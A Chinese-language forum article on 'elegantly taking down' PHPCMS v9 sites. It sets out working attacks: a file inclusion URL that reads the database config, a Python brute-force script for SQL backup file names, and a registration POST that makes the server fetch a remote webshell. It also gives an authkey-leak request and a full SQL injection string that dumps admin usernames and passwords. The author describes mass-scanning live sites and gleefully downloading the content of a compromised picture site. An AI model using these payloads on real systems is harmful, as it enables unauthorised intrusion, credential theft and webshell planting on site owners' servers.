作者：J0o1ey

原文来自：[论如何优雅地拿下PHPCMS](https://bbs.ichunqiu.com/thread-44046-1-1.html?from=beef)

  

 **一、PHPCMS简介**

PHP是国内领先的网站内容管理系统，同时也是一个开源的PHP开发框架，采用PHP5+MYSQL进行开发，拥有非常庞大的用户量。

百度百科介绍其优点主要如下：

①功能强大  
②模块化，开源，可扩展功能强大灵活

③支持自定义模型和字段负载能力强，支持千万级数据模板制作方便

④支持中文标签和万能标签进行数据调用拥有门户级的碎片功能，

⑤融入了人性化体验

⑥加强了安全机制

前五条我们无可厚非，因为PHPCMS的开发团队确实比较专业和优秀，但是就算他真的安全机制优秀，难道我们就拿他没办法了嘛？作为一名小学生，自然是不服，让我们今天来盘点一下PHPCMS
v9这些年爆出来的常见漏洞~(鸡肋一些的漏洞在此就不介绍了，主要介绍一些比较凶残的)

 **  
**

 **二、PHPCMS V9本地文件包含漏洞**

漏洞出现在如下文件:phpcms/modules/search/index.php

代码如下：

![image.png](https://image.3001.net/images/20180813/1534140882_5b7121d24b375.png!small)

本处大家会发现在使用file_get_contents函数时没有过滤get方式得到的m参数  
因此可以构造payload如下  
www.xxx.com/m=search&a=public_get_suggest_keyword&q=../../phpsso_server/caches/configs/database.php

如果存在漏洞即可成功读取到phpcms的数据库配置文件，如图  

  
![image.png](https://image.3001.net/images/20180813/1534140891_5b7121dbd9961.png!small)

  

 **  
**

 **三、 phpcms V9 sql备份文件名爆破**

参考文章:[phpcms V9
sql备份文件名爆破](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=35472&fromuid=229729?from=beef)

payload：/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/gv5dmx<<.sql

> 我们知道windows的FindFirstFile（API)有个特性就是可以把<<当成通配符来用  
>
> 而PHP的opendir(win32readdir.c)就使用了该API。PHP的文件操作函数均调用了opendir,所以file_exists也有此特性。  
>

这个漏洞和前一阵子dedecms后台爆破如出一辙，api.php文件的$op变量决定用户的操作

  
![image.png](https://image.3001.net/images/20180813/1534140972_5b71222cad2b2.png!small)  

在/api/creatimg.php文件中，使用了file_exists()函数判断$fontfile文件是否存在，文件存在和不存在的返回信息是不同的，而且$fontfile可以被用户控制，且未过滤.和/等符号，最终导致了漏洞发生。

  
  

# /api/creatimg.php

<?php

defined('IN_PHPCMS') or exit('No permission resources.');

$txt = trim($_GET['txt']);

if(extension_loaded('gd') && $txt ) {

......

$fontfile = isset($_GET['font']) && !empty($_GET['font']) ?
$fontpath.trim($_GET['font']) : $fontpath.'georgia.ttf';

......

if(file_exists($fontfile)){

//计算文本写入后的宽度，右下角 X 位置-左下角 X 位置

$image_info = imagettfbbox($fontsize,0,$fontfile,$txt);

$imageX = $image_info[2]-$image_info[0]+10;

$imageY = $image_info[1]-$image_info[7]+5;

......

  

爆破脚本如下：

  
  

#!/usr/bin/env python

# coding=utf-8

'''/*

* author = Mochazz

* team = 红日安全团队

* env = pyton3

*

*/

'''

import requests

import itertools

characters = "abcdefghjklmnopqrstuvwxyz0123456789_!#"

backup_sql = ""

payload =
"/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

url = "http://192.168.0.106"

flag = 0

for num in range(1,7):

if flag:

break

for pre in itertools.permutations(characters,num):

pre = ''.join(list(pre))

payload = payload.format(location=pre)

r = requests.get(url+payload)

if r.status_code == 200 and "PNG" in r.text:

flag = 1

backup_sql = pre

payload =
"/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

break

else:

payload =
"/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

print("[+] 前缀为：",backup_sql)

flag = 0

for i in range(30):

if flag:

break

for ch in characters:

if ch == characters[-1]:

flag = 1

break

payload = payload.format(location=backup_sql+ch)

r = requests.get(url + payload)

if r.status_code == 200 and "PNG" in r.text:

backup_sql += ch

print("[+] ",backup_sql)

payload =
"/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

break

else:

payload =
"/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"

print("备份sql文件地址为：",backup_sql+".sql")

  

效果如下：![14.gif](https://image.3001.net/images/20180813/1534141051_5b71227bd17b6.gif!small)

拿到SQL文件后，可以导入本地查看，后续操作这里不多加赘述

  

 **四、 PHPCMS前台上传getshell**

漏洞复现参考(<https://www.hackersb.cn/hacker/219.html>)

漏洞复现的办法是先打开注册页面:

www.xxx.com/index.php?m=member&c=index&a=register&siteid=1]www.xxx.com/index.php?m=member&c=index&a=register&siteid=

然后向注册页面POST如下payload：

siteid=1&modelid=11&username=123456&password=123456&email=123456@qq.com&info[content]=<img
src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg>&dosubmit=1&protocol=然后就会报错并返回shell地址：

![image.png](https://image.3001.net/images/20180813/1534141082_5b71229a5a7c3.png!small)

然后就可以连接啦。

![image.png](https://image.3001.net/images/20180813/1534141101_5b7122ad70571.png!small)  

但我在实战测试过程中发现这个漏洞由于危害极大，基本上都已经被运维打补丁了，因此现在存在这个漏洞的站点并不是很多

  

 **五、 PHPCMS利用authkey泄露进行注入**

众所周和PHPCMS在拿到authkey(这边简称key吧)，便有一大堆注入，在此给大家简单讲解一下

首先分享一下爆出key的payload

www.xxx.com/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\phpsso_server\caches\caches_admin\caches_data\applist&path=admin

![image.png](https://image.3001.net/images/20180813/1534141116_5b7122bc8cac9.png!small)  

如图中的XI0G8h0TYyWTwZMFIgN9nxHUN9Syymf便是我们所说的key

拿到key后，我们该怎么办呢？

我们这边使用一个名为a.php的exp（exp请回复后下载）

大家可以使用phpstudy安装PHP环境

用法：将a.php丢到phpstudy配置的网站根目录中

访问url:

http://localhost/a.php?url=你要测试的url（不要加http）&key=你得到的key&id=userid=1%20and%20(SELECT%201%20FROM(SELECT%20count(*),concat((SELECT(SELECT%20concat(0x7e,0x27,cast((substring((select+concat(0x7e,0x27,username,0x3a,+password,+0x3a,+encrypt,0x27,0x40,0x7e)+FROM+`v9_admin`+WHERE+1+limit+0,1),1,62))%20as%20char),0x27,0x7e))%20FROM%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20FROM%20information_schema.columns%20group%20by%20x)a)

  

即可得到后台账号和密码，但是密码是加了salt的，大家可以去

http://cmd.la进行解密，但是是要收费的，你懂得

![image.png](https://image.3001.net/images/20180813/1534141129_5b7122c95dc70.png!small)

然后使用解出的明文密码登录[www.xxx.com/admin.php](http://www.xxx.com/admin.php)即可~

 **  
**

 **六、 利用fuzz框架批量检测PHPCMS漏洞**

我作为一名懒人，叫我一个个地手动检测漏洞是很不现实的，因此我选择使用test404的一款http fuzz框架实现批量检测

简单地编写了一下上述漏洞的插件，采集url进行批量fuzz，效果还是很不错的

如图是使用爆key插件的结果（还有很多了，不一一展示）

这些爆出key的大部分都是存在SQL注入的  
![image.png](https://image.3001.net/images/20180813/1534141149_5b7122dda61f2.png!small)有时候还会有福利，搞到个美女图片站什么的，把资源全部打包爽歪歪。。。![image.png](https://image.3001.net/images/20180813/1534141168_5b7122f0bd4dd.png!small)

至于插件一类的，大家可以[阅读原文](https://bbs.ichunqiu.com/thread-44046-1-1.html?from=beef)下载哈~

  

 **七、 资源下载**

[阅读原文](https://bbs.ichunqiu.com/thread-44046-1-1.html?from=beef)即可下载：http
fuzzer+编写好的插件，利用key注入的exp（exp请把txt扩展名改为php）

